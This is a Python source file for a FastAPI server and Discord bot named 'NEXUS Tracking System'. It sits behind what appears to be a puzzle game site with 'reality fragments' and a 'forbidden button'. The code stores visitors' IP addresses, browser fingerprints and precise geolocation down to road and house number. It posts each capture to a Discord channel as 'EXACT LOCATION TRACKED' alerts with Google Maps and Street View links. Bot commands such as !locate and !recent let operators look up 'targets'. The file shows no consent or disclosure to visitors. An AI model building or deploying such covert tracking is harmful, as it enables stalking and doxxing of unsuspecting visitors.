import os
import json
import random
import asyncio
import threading
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from pydantic import BaseModel
import sqlite3
import hashlib
from dotenv import load_dotenv
import uuid
from typing import Optional, Dict, Any

load_dotenv()

# ==================== CONFIGURATION ====================
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
RENDER = os.getenv('RENDER', False)
FRONTEND_URL = "https://gamef-swart.vercel.app"

# ==================== DATA MODELS ====================
class TrackingData(BaseModel):
    type: str
    data: dict
    timestamp: str
    userAgent: str = ""

class LocationData(BaseModel):
    lat: float
    lon: float
    accuracy: float
    address: Optional[str] = None
    city: Optional[str] = None
    county: Optional[str] = None
    state: Optional[str] = None
    zip: Optional[str] = None
    country: Optional[str] = None
    neighbourhood: Optional[str] = None
    road: Optional[str] = None
    house_number: Optional[str] = None
    source: Optional[str] = None

class SystemData(BaseModel):
    platform: str
    browser: str
    cores: int
    memory: str
    screen: str
    timezone: str
    language: str
    cookies: bool
    doNotTrack: Optional[str] = None

class FragmentData(BaseModel):
    fragment: int

class ButtonData(BaseModel):
    presses: int
    message: str

class ThreatData(BaseModel):
    level: int
    message: str

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System API")

# CORS for frontend only
app.add_middleware(
    CORSMiddleware,
    allow_origins=[FRONTEND_URL, "https://gamef-swart.vercel.app/"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP ====================
DB_PATH = '/tmp/nexus.db' if RENDER else 'nexus.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, 
                  last_seen TIMESTAMP, visit_count INTEGER)''')
    
    # Locations table - exact location data
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                  address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
                  neighbourhood TEXT, road TEXT, house_number TEXT, source TEXT, timestamp TIMESTAMP)''')
    
    # System fingerprints
    c.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
                  memory TEXT, screen TEXT, timezone TEXT, language TEXT, cookies BOOLEAN, 
                  do_not_track TEXT, timestamp TIMESTAMP)''')
    
    # Reality fragments
    c.execute('''CREATE TABLE IF NOT EXISTS fragments
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
    
    # Forbidden button presses
    c.execute('''CREATE TABLE IF NOT EXISTS button_presses
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    # Threat levels
    c.execute('''CREATE TABLE IF NOT EXISTS threats
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    # Deep scan results
    c.execute('''CREATE TABLE IF NOT EXISTS deep_scans
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, scan_data TEXT, timestamp TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== ACTIVE USER SESSIONS ====================
active_users = {}  # user_id -> last_seen

# ==================== DISCORD BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class DiscordBot:
    def __init__(self):
        self.bot = bot
        self.ready = False
        self.channel = None
    
    async def start(self):
        try:
            await self.bot.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    async def send_new_visitor(self, user_id: str, data: dict, ip: str):
        """Send new visitor alert to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="🎯 NEW WEBSITE VISITOR",
                color=Color.purple(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="🕒 Time", value=f"`{datetime.now().strftime('%H:%M:%S')}`", inline=True)
            
            # Get today's visitor count
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            today = datetime.now().date()
            c.execute("SELECT COUNT(DISTINCT id) FROM users WHERE DATE(first_seen) = DATE(?)", (today,))
            count = c.fetchone()[0] or 0
            conn.close()
            
            embed.set_footer(text=f"Today's visitors: {count}")
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_exact_location(self, user_id: str, data: LocationData, ip: str):
        """Send exact location to Discord with full details"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="📍 EXACT LOCATION TRACKED",
                color=Color.red(),
                timestamp=datetime.now()
            )
            
            # User info
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="🎯 Accuracy", value=f"`{data.accuracy}m`", inline=True)
            
            # Coordinates
            embed.add_field(
                name="📍 Coordinates",
                value=f"```\nLatitude:  {data.lat}\nLongitude: {data.lon}```",
                inline=False
            )
            
            # Full address if available
            if data.address:
                embed.add_field(
                    name="🏠 Exact Address",
                    value=f"```{data.address}```",
                    inline=False
                )
            
            # Location details in organized format
            details = []
            if data.house_number:
                details.append(f"🏠 **House:** {data.house_number}")
            if data.road:
                details.append(f"🛣️ **Road:** {data.road}")
            if data.neighbourhood and data.neighbourhood != "N/A":
                details.append(f"🏘️ **Neighbourhood:** {data.neighbourhood}")
            if data.city and data.city != "N/A":
                details.append(f"🏙️ **City:** {data.city}")
            if data.county:
                details.append(f"🗺️ **County:** {data.county}")
            if data.state:
                details.append(f"📍 **State:** {data.state}")
            if data.zip:
                details.append(f"📮 **ZIP:** {data.zip}")
            if data.country:
                details.append(f"🌍 **Country:** {data.country}")
            if data.source:
                details.append(f"📡 **Source:** {data.source}")
            
            if details:
                embed.add_field(
                    name="📋 Location Details",
                    value="\n".join(details),
                    inline=False
                )
            
            # Maps links
            maps_url = f"https://www.google.com/maps?q={data.lat},{data.lon}"
            street_view_url = f"https://www.google.com/maps?q={data.lat},{data.lon}&layer=c"
            
            embed.add_field(
                name="🗺️ Google Maps",
                value=f"[Open in Google Maps]({maps_url})",
                inline=True
            )
            embed.add_field(
                name="📸 Street View",
                value=f"[Open Street View]({street_view_url})",
                inline=True
            )
            
            # Threat level (calculate based on accuracy)
            threat_level = min(100, int(30 + (100 - data.accuracy) / 10))
            threat_color = "🟢" if threat_level < 40 else "🟡" if threat_level < 70 else "🔴"
            embed.add_field(
                name="⚠️ Threat Level",
                value=f"{threat_color} `{threat_level}%`",
                inline=True
            )
            
            await self.channel.send(embed=embed)
            
            # Also send raw data for debugging
            raw_data = f"**Raw Location Data:**\n```json\n{json.dumps(data.dict(), indent=2)}```"
            await self.channel.send(raw_data)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_system_fingerprint(self, user_id: str, data: SystemData, ip: str):
        """Send system fingerprint to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="💻 SYSTEM FINGERPRINT",
                color=Color.blue(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            
            # System details
            embed.add_field(name="💿 Platform", value=f"`{data.platform}`", inline=True)
            embed.add_field(name="🌍 Browser", value=f"`{data.browser[:50]}...`", inline=True)
            embed.add_field(name="⚡ CPU Cores", value=f"`{data.cores}`", inline=True)
            embed.add_field(name="💾 RAM", value=f"`{data.memory}`", inline=True)
            embed.add_field(name="📺 Screen", value=f"`{data.screen}`", inline=True)
            embed.add_field(name="⏰ Timezone", value=f"`{data.timezone}`", inline=True)
            embed.add_field(name="🗣️ Language", value=f"`{data.language}`", inline=True)
            embed.add_field(name="🍪 Cookies", value=f"`{'Enabled' if data.cookies else 'Disabled'}`", inline=True)
            
            if data.doNotTrack:
                embed.add_field(name="🚫 Do Not Track", value=f"`{data.doNotTrack}`", inline=True)
            
            # Create browser fingerprint hash
            fingerprint = hashlib.md5(
                f"{data.platform}{data.screen}{data.timezone}{data.cores}".encode()
            ).hexdigest()[:8]
            embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_fragment(self, user_id: str, data: FragmentData, ip: str):
        """Send fragment collection to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            # Get current fragment count
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM fragments WHERE user_id = ?", (user_id,))
            total = c.fetchone()[0] or 0
            conn.close()
            
            embed = Embed(
                title="🧩 REALITY FRAGMENT COLLECTED",
                color=Color.green(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🧩 Fragment", value=f"`{data.fragment}/9`", inline=True)
            embed.add_field(name="📊 Total", value=f"`{total}/9`", inline=True)
            
            # Progress bar
            progress = "▓" * total + "░" * (9 - total)
            embed.add_field(name="📈 Progress", value=f"`{progress}`", inline=False)
            
            if total == 9:
                embed.add_field(
                    name="⚠️ COMPLETE",
                    value="All reality fragments assembled!",
                    inline=False
                )
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_button_press(self, user_id: str, data: ButtonData, ip: str):
        """Send forbidden button press to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="🚫 FORBIDDEN BUTTON PRESSED",
                color=Color.dark_red(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🔢 Press #", value=f"`{data.presses}`", inline=True)
            embed.add_field(name="💬 Message", value=f"```{data.message}```", inline=False)
            
            # Special messages for certain press counts
            if data.presses in [3, 6, 9]:
                embed.add_field(
                    name="⚠️ EVENT",
                    value="Reality fragment discovered!",
                    inline=False
                )
            
            if data.presses == 9:
                embed.add_field(
                    name="🔓 SECRET UNLOCKED",
                    value="Coordinates revealed: 60.233, 24.866",
                    inline=False
                )
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_threat(self, user_id: str, data: ThreatData, ip: str):
        """Send high threat alert to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            color = Color.dark_red() if data.level > 90 else Color.red()
            
            embed = Embed(
                title="🚨 CRITICAL THREAT DETECTED" if data.level > 90 else "⚠️ HIGH THREAT DETECTED",
                color=color,
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="⚠️ Threat Level", value=f"`{data.level}%`", inline=True)
            embed.add_field(name="💬 Message", value=f"```{data.message}```", inline=False)
            
            # @everyone for critical threats
            if data.level > 90:
                await self.channel.send("@everyone **CRITICAL THREAT LEVEL REACHED**")
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")
    
    async def send_deep_scan(self, user_id: str, scan_data: dict, ip: str):
        """Send deep scan results to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(
                title="🔬 DEEP SCAN COMPLETE",
                color=Color.purple(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            
            # Format scan data
            scan_text = json.dumps(scan_data, indent=2)[:1000]
            embed.add_field(
                name="📊 Scan Results",
                value=f"```json\n{scan_text}```",
                inline=False
            )
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord error: {e}")

discord_bot = DiscordBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Discord bot online as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
    
    if discord_bot.channel:
        print(f'✅ Connected to channel: #{discord_bot.channel.name} (ID: {DISCORD_CHANNEL_ID})')
        discord_bot.ready = True
        
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{discord_bot.channel.name}", inline=True)
        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
        
        await discord_bot.channel.send(embed=embed)
    else:
        print(f'❌ Could not find channel with ID: {DISCORD_CHANNEL_ID}')

# ==================== DISCORD COMMANDS ====================
@bot.command(name='stats')
async def stats(ctx):
    """Get tracking statistics"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Total users
    c.execute("SELECT COUNT(DISTINCT id) FROM users")
    total_users = c.fetchone()[0] or 0
    
    # Today's users
    today = datetime.now().date()
    c.execute("SELECT COUNT(DISTINCT id) FROM users WHERE DATE(first_seen) = DATE(?)", (today,))
    today_users = c.fetchone()[0] or 0
    
    # Online now
    online_now = len(active_users)
    
    # Locations
    c.execute("SELECT COUNT(*) FROM locations")
    total_locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-1 hour')")
    locations_1h = c.fetchone()[0] or 0
    
    # Fragments
    c.execute("SELECT COUNT(*) FROM fragments")
    total_fragments = c.fetchone()[0] or 0
    
    # Button presses
    c.execute("SELECT SUM(press_count) FROM button_presses")
    total_presses = c.fetchone()[0] or 0
    
    # Latest location
    c.execute('''SELECT latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT 1''')
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
    embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
    embed.add_field(name="Today's Users", value=f"`{today_users}`", inline=True)
    embed.add_field(name="Online Now", value=f"`{online_now}`", inline=True)
    embed.add_field(name="Total Locations", value=f"`{total_locations}`", inline=True)
    embed.add_field(name="Locations (1h)", value=f"`{locations_1h}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{total_fragments}`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{total_presses}`", inline=True)
    
    if latest:
        time_ago = datetime.fromisoformat(latest[4]) if latest[4] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        location_text = latest[2] or latest[3] or f"{latest[0]:.6f}, {latest[1]:.6f}"
        embed.add_field(
            name=f"Latest Location ({mins_ago}m ago)",
            value=f"```{location_text[:100]}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='online')
async def online_users(ctx):
    """List online users"""
    if not active_users:
        await ctx.send("No users currently online")
        return
    
    embed = Embed(title="🟢 ONLINE USERS", color=Color.green())
    
    for user_id, last_seen in active_users.items():
        # Get user info
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT ip, last_seen FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        
        if user:
            seconds_ago = int((datetime.now() - datetime.fromisoformat(user[1])).total_seconds())
            status = f"IP: {user[0]}\nLast active: {seconds_ago}s ago"
        else:
            status = "Unknown"
        
        embed.add_field(name=f"User {user_id[:8]}", value=status, inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='locate')
async def locate_user(ctx, user_id: str):
    """Get latest location for a user"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT latitude, longitude, accuracy, address, city, state, country, 
                        house_number, road, timestamp, source
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', 
              (f'{user_id}%',))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await ctx.send(f"No location found for user {user_id}")
        return
    
    embed = Embed(title="📍 USER LOCATION", color=Color.green())
    embed.add_field(name="User ID", value=f"`{user_id}`", inline=False)
    
    # Format address
    if loc[3]:  # Full address
        address = loc[3]
    else:
        parts = []
        if loc[7]: parts.append(loc[7])  # house_number
        if loc[8]: parts.append(loc[8])  # road
        if loc[4]: parts.append(loc[4])  # city
        if loc[5]: parts.append(loc[5])  # state
        address = ", ".join(parts) if parts else "Unknown"
    
    embed.add_field(name="📍 Location", value=f"```{address}```", inline=False)
    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
    embed.add_field(name="Accuracy", value=f"`{loc[2]}m`", inline=True)
    embed.add_field(name="Source", value=f"`{loc[10] or 'Unknown'}`", inline=True)
    
    # Check if online
    online = "🟢 Online" if user_id in active_users else "🔴 Offline"
    embed.add_field(name="Status", value=online, inline=True)
    
    # Maps link
    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
    embed.add_field(name="Map", value=f"[Open in Google Maps]({maps_url})", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='user')
async def user_info(ctx, user_id: str):
    """Get full user information"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Basic info
    c.execute("SELECT ip, user_agent, first_seen, last_seen, visit_count FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if not user:
        await ctx.send(f"User {user_id} not found")
        conn.close()
        return
    
    # Stats
    c.execute("SELECT COUNT(*) FROM locations WHERE user_id = ?", (user_id,))
    loc_count = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM fragments WHERE user_id = ?", (user_id,))
    frag_count = c.fetchone()[0]
    
    c.execute("SELECT SUM(press_count) FROM button_presses WHERE user_id = ?", (user_id,))
    press_count = c.fetchone()[0] or 0
    
    c.execute("SELECT MAX(threat_level) FROM threats WHERE user_id = ?", (user_id,))
    max_threat = c.fetchone()[0] or 0
    
    # Latest location
    c.execute("SELECT address, latitude, longitude FROM locations WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1", (user_id,))
    latest_loc = c.fetchone()
    
    conn.close()
    
    embed = Embed(title=f"👤 USER INFORMATION: {user_id[:8]}", color=Color.blue())
    embed.add_field(name="IP Address", value=f"`{user[0]}`", inline=True)
    embed.add_field(name="First Seen", value=f"`{user[2][:16]}`", inline=True)
    embed.add_field(name="Last Seen", value=f"`{user[3][:16]}`", inline=True)
    embed.add_field(name="Visit Count", value=f"`{user[4]}`", inline=True)
    embed.add_field(name="Locations", value=f"`{loc_count}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{frag_count}/9`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{press_count}`", inline=True)
    embed.add_field(name="Max Threat", value=f"`{max_threat}%`", inline=True)
    
    if latest_loc:
        embed.add_field(
            name="Latest Location",
            value=f"```{latest_loc[0] or f'{latest_loc[1]:.6f}, {latest_loc[2]:.6f}'}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='recent')
async def recent_locations(ctx, limit: int = 5):
    """Show recent locations"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (limit,))
    locs = c.fetchall()
    conn.close()
    
    if not locs:
        await ctx.send("No locations found")
        return
    
    embed = Embed(title=f"📍 RECENT LOCATIONS", color=Color.purple())
    
    for i, loc in enumerate(locs, 1):
        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        location_text = loc[3] or loc[4] or f"{loc[1]:.4f}, {loc[2]:.4f}"
        online = "🟢" if loc[0] in active_users else "🔴"
        
        embed.add_field(
            name=f"{i}. {online} User {loc[0][:8]} - {mins_ago}m ago",
            value=f"```{location_text[:75]}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='fragments')
async def fragment_leaderboard(ctx):
    """Show fragment collection leaderboard"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT user_id, COUNT(*) as count 
                 FROM fragments 
                 GROUP BY user_id 
                 ORDER BY count DESC 
                 LIMIT 10''')
    leaders = c.fetchall()
    conn.close()
    
    if not leaders:
        await ctx.send("No fragments collected yet")
        return
    
    embed = Embed(title="🧩 FRAGMENT LEADERBOARD", color=Color.gold())
    
    for i, (user_id, count) in enumerate(leaders, 1):
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "📌"
        online = "🟢" if user_id in active_users else "🔴"
        embed.add_field(
            name=f"{medal} {online} User {user_id[:8]}",
            value=f"`{count}/9 fragments`",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def send_alert(ctx, *, message: str):
    """Send alert to all users (note: requires WebSocket implementation)"""
    await ctx.send("⚠️ Alert functionality requires WebSocket connection with frontend")
    # You would need to implement WebSocket broadcasting here

@bot.command(name='help_nexus')
async def help_command(ctx):
    """Show all commands"""
    embed = Embed(title="🔮 NEXUS COMMANDS", color=Color.purple())
    
    commands_list = [
        "**📊 Statistics:**",
        "`!stats` - Show tracking statistics",
        "`!online` - List online users",
        "`!recent [n]` - Show recent locations (default: 5)",
        "",
        "**👤 User Info:**",
        "`!locate [user_id]` - Get user's latest location",
        "`!user [user_id]` - Get full user information",
        "`!fragments` - Show fragment leaderboard",
        "",
        "**⚠️ Alerts:**",
        "`!alert [message]` - Send alert (requires WebSocket)",
        "",
        "**❓ Help:**",
        "`!help_nexus` - Show this help message"
    ]
    
    embed.add_field(name="Available Commands", value="\n".join(commands_list), inline=False)
    embed.set_footer(text=f"Online Users: {len(active_users)}")
    
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.get("/")
async def root():
    """API root"""
    return {
        "name": "NEXUS Tracking System API",
        "version": "2.0",
        "status": "online",
        "frontend": FRONTEND_URL,
        "endpoints": [
            "/api/track - POST tracking data",
            "/api/health - GET health check",
            "/api/stats - GET statistics"
        ]
    }

@app.get("/api/health")
async def health():
    """Health check endpoint"""
    return {
        "status": "online",
        "bot_ready": discord_bot.ready,
        "active_users": len(active_users),
        "timestamp": datetime.now().isoformat()
    }

@app.get("/api/stats")
async def get_stats():
    """Get public statistics"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT id) FROM users")
    total_users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations")
    total_locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM fragments")
    total_fragments = c.fetchone()[0] or 0
    
    conn.close()
    
    return {
        "total_users": total_users,
        "online_now": len(active_users),
        "total_locations": total_locations,
        "total_fragments": total_fragments
    }

@app.post("/api/track")
async def track_data(request: Request, data: TrackingData):
    """Main tracking endpoint - receives all data from frontend"""
    try:
        client_ip = request.client.host
        user_agent = data.userAgent or request.headers.get('user-agent', '')
        
        # Generate consistent user ID
        user_id = hashlib.sha256(f"{client_ip}_{user_agent}".encode()).hexdigest()[:16]
        
        # Update active users
        active_users[user_id] = datetime.now()
        
        # Clean old users (older than 5 minutes)
        now = datetime.now()
        expired = [uid for uid, last_seen in active_users.items() 
                  if (now - last_seen).total_seconds() > 300]
        for uid in expired:
            del active_users[uid]
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Check if new user
        c.execute("SELECT COUNT(*) FROM users WHERE id = ?", (user_id,))
        is_new = c.fetchone()[0] == 0
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, 
                     COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                     ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, user_agent, user_id, datetime.now(), datetime.now(), user_id))
        
        # Process based on data type
        if data.type == "location":
            loc_data = LocationData(**data.data)
            
            c.execute('''INSERT INTO locations 
                        (user_id, latitude, longitude, accuracy, address, city, county, state, 
                         zip, country, neighbourhood, road, house_number, source, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, loc_data.lat, loc_data.lon, loc_data.accuracy, loc_data.address,
                      loc_data.city, loc_data.county, loc_data.state, loc_data.zip, loc_data.country,
                      loc_data.neighbourhood, loc_data.road, loc_data.house_number, loc_data.source,
                      datetime.now()))
            
            # Send to Discord
            asyncio.create_task(discord_bot.send_exact_location(user_id, loc_data, client_ip))
            
            # If new user, also send welcome
            if is_new:
                asyncio.create_task(discord_bot.send_new_visitor(user_id, {"location": True}, client_ip))
        
        elif data.type == "system":
            sys_data = SystemData(**data.data)
            
            c.execute('''INSERT INTO fingerprints 
                        (user_id, platform, browser, cores, memory, screen, timezone, 
                         language, cookies, do_not_track, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, sys_data.platform, sys_data.browser, sys_data.cores,
                      sys_data.memory, sys_data.screen, sys_data.timezone, sys_data.language,
                      sys_data.cookies, sys_data.doNotTrack, datetime.now()))
            
            asyncio.create_task(discord_bot.send_system_fingerprint(user_id, sys_data, client_ip))
            
            if is_new:
                asyncio.create_task(discord_bot.send_new_visitor(user_id, {"system": True}, client_ip))
        
        elif data.type == "fragment":
            frag_data = FragmentData(**data.data)
            
            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, frag_data.fragment, datetime.now()))
            
            asyncio.create_task(discord_bot.send_fragment(user_id, frag_data, client_ip))
        
        elif data.type == "button":
            btn_data = ButtonData(**data.data)
            
            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                        VALUES (?, ?, ?, ?)''', 
                     (user_id, btn_data.presses, btn_data.message, datetime.now()))
            
            asyncio.create_task(discord_bot.send_button_press(user_id, btn_data, client_ip))
        
        elif data.type == "threat":
            threat_data = ThreatData(**data.data)
            
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''', 
                     (user_id, threat_data.level, threat_data.message, datetime.now()))
            
            if threat_data.level > 70:
                asyncio.create_task(discord_bot.send_threat(user_id, threat_data, client_ip))
        
        elif data.type == "deep_scan":
            c.execute('''INSERT INTO deep_scans (user_id, scan_data, timestamp)
                        VALUES (?, ?, ?)''', 
                     (user_id, json.dumps(data.data), datetime.now()))
            
            asyncio.create_task(discord_bot.send_deep_scan(user_id, data.data, client_ip))
        
        conn.commit()
        conn.close()
        
        return JSONResponse({
            "status": "tracked", 
            "user_id": user_id,
            "is_new": is_new
        })
        
    except Exception as e:
        print(f"Error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

# ==================== STARTUP ====================
async def run_bot():
    try:
        await bot.start(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def start_bot_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

@app.on_event("startup")
async def startup_event():
    """Start Discord bot when FastAPI starts"""
    if DISCORD_TOKEN and DISCORD_CHANNEL_ID:
        thread = threading.Thread(target=start_bot_thread, daemon=True)
        thread.start()
        print("✅ Discord bot thread started")
    else:
        print("❌ Discord credentials missing - bot not started")

# ==================== RUN ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM API")
    print("=" * 50)
    print(f"📡 Frontend URL: {FRONTEND_URL}")
    print(f"📡 Discord Token: {DISCORD_TOKEN[:10]}..." if DISCORD_TOKEN else "❌ No Discord token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"📁 Database: {DB_PATH}")
    print("=" * 50)
    
    port = int(os.getenv('PORT', 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
